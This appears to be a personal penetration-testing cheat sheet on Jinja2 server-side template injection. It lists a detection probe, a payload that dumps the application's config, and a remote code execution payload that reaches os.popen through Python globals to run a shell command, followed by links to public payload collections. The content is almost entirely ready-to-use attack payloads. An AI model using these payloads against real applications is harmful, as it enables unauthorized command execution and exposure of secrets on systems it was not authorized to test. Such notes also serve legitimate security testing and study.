# python-jinja2

**Author:** Julien Bongars\
**Date:** 2025-10-07 17:49:03
**Path:**

---

Jinja2 server-side template injection. Confirm evaluation first, then read config or run a command.

## Detection

```
{{8*8}}
```

If the response contains `64`, the field is evaluated.

## Config

```
{{ config.items() }}
```

## RCE

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## Resources

- [PayloadsAllTheThings — SSTI (Jinja2)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2) — detection and RCE variants
- [HackTricks — SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) — engine identification
